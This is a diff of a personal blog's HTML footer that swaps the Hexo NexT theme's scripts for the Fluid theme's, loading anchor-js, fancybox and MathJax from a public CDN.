-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">V4Ethan</span>
-</div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
-  </div>
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
 
   
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
 
-<script src="/js/utils.js"></script>
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
 
-<script src="/js/motion.js"></script>
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
 
 
-<script src="/js/schemes/pisces.js"></script>
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
 
 
-<script src="/js/next-boot.js"></script>
 
 
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
 
 
   
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
 </body>
 </html>
